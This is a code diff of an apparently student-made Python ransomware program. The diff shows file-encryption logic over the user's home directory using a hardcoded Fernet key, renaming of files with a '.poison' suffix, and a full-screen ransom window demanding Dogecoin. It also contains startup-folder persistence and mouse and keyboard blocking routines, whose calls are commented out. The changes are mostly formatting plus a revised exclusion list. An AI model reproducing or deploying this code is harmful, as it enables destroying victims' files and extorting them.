@@ -19,7 +19,7 @@ executing = True
 filename = "".join(["\\", __file__.split('\\')[-1].split('.')[0], ".exe"])
 KEY: Final = b'171yM5aII7w0cM2C0EtD9yOlU71d4vooktwHOIsoZ6I='
 DEST_PATH: Final = f"C:\\Users\\{getuser()}"
-DIR_EXCLUSIONS: Final = ["backup", "AppData", "encrypt.py"]
+DIR_EXCLUSIONS: Final = [".vscode", "AppData", "encrypt.py", ".git", "Searches"]
 FILE_SUFFIX: Final = "poison"
 FILE_SUFFIX_EXCLUSIONS: Final = [FILE_SUFFIX, "exe", "ini", "DAT", "LOG1", "LOG2", "blf", "regtrans-ms", "gitconfig"]
 URL: Final = ("https://ia903206.us.archive.org/31/items/rick-astley-never-gonna-give-you-up/Rick%20Astley%20-%20Never%20Gonna%20Give%20You%20Up.mp3")
@@ -40,22 +40,22 @@ class Encryption(threading.Thread):
         filtered_file_paths = []
 
         for root, dirs, files in os.walk(DEST_PATH):
-            for file in files: 
+            for file in files:
                 full_path = f"{root}\\{file}"
                 if (not file.split(".")[-1] in FILE_SUFFIX_EXCLUSIONS):
                     file_paths.append(full_path)
-                    
+        
         for file_path in file_paths:
             exception = False
             for dir_exclusion in DIR_EXCLUSIONS:
-                if(file_path.__contains__(dir_exclusion)):
+                if (file_path.__contains__(dir_exclusion)):
                     exception = True
-            if(not exception):
+            if (not exception):
                 print(file_path)
                 filtered_file_paths.append(file_path)
-        
+
         return filtered_file_paths
-    
+
     def stopThread(self):
         self.stop = True
 
@@ -67,8 +67,8 @@ class Encryption(threading.Thread):
             with open(file, "wb") as binary_file:
                 binary_file.write(encrypted_content)
             os.rename(file, f"{file}.{self.FILE_SUFFIX}")
-            
-            if(self.stop):
+
+            if (self.stop):
                 break
 
     def run(self):
@@ -96,7 +96,7 @@ class Decryption(threading.Thread):
     def decryptFiles(self, file_paths):
         for file in file_paths:
             with open(file, "rb") as binary_file:
-                content = binary_file.read()    
+                content = binary_file.read()
             decrypted_content = Fernet(self.KEY).decrypt(content)
             with open(file, "wb") as binary_file:
                 try:
@@ -133,6 +133,7 @@ def create_autostart_dir():
     except:
         print("error")
 
+
 def remove_autostart_dir():
     startup = f"C:\\Users\\{getuser()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
     try:
@@ -140,6 +141,7 @@ def remove_autostart_dir():
         os.remove(f"{startup}{filename}")
     except:
         print("error")
+
 
 def disable_mouse():
     global executing
@@ -183,16 +185,17 @@ window.configure(bg="red")
 window.bind('<Return>', stop_torture)
 window.protocol("WM_DELETE_WINDOW", on_closing)
 
-title = tk.Label(window, bg="red", fg="white", text="uups, u fucked up :DD",font=("Comic Sans MS", 40))
+title = tk.Label(window, bg="red", fg="white",
+                 text="uups, u fucked up :DD", font=("Comic Sans MS", 40))
 title.pack(padx=30, pady=30)
 
-ransom = tk.Label(window, bg="red", fg="white", text="All your files have been encrypted. If you want to decrypt them, pay 10 Dogecoins to the following address: 'in21-25a.ch'. We will then give you a decryption key",font=("Comic Sans MS", 30), wraplength=1200)
+ransom = tk.Label(window, bg="red", fg="white", text="All your files have been encrypted. If you want to decrypt them, pay 10 Dogecoins to the following address: 'in21-25a.ch'. We will then give you a decryption key",
+                  font=("Comic Sans MS", 30), wraplength=1200)
 ransom.pack(padx=50, pady=70)
 entry = Entry(window, fg='red', font=('Comic Sans MS', 30))
 entry.pack()
 entry.focus()
-snake = tk.Label(window, bg="red", fg="white", text=
-"""
+snake = tk.Label(window, bg="red", fg="white", text="""
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⡉⠙⣻⣷⣶⣤⣀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⡿⠋⠀⠀⠀⠀⢹⣿⣿⡟⠉⠉⠉⢻⡿⠀⠀⠀
@@ -208,14 +211,14 @@ snake = tk.Label(window, bg="red", fg="white", text=
 ⠀⠀⠀⠀⠙⢿⣿⣿⣿⣶⣦⣤⣀⣀⡀⠀⠀⠀⣀⣠⣴⣾⣿⣿⣿⡿⠃⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠈⠙⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠋⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⠛⠛⠛⠛⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀
-""",font=("Arial", 22))
+""", font=("Arial", 22))
 snake.pack(pady=20)
 
 # create_autostart_regedit()
-#create_autostart_dir()
+# create_autostart_dir()
 
-#threading.Thread(target=disable_mouse, daemon=True).start()
-#threading.Thread(target=block_keys, daemon=True).start()
+# threading.Thread(target=disable_mouse, daemon=True).start()
+# threading.Thread(target=block_keys, daemon=True).start()
 
 dc.start()
 
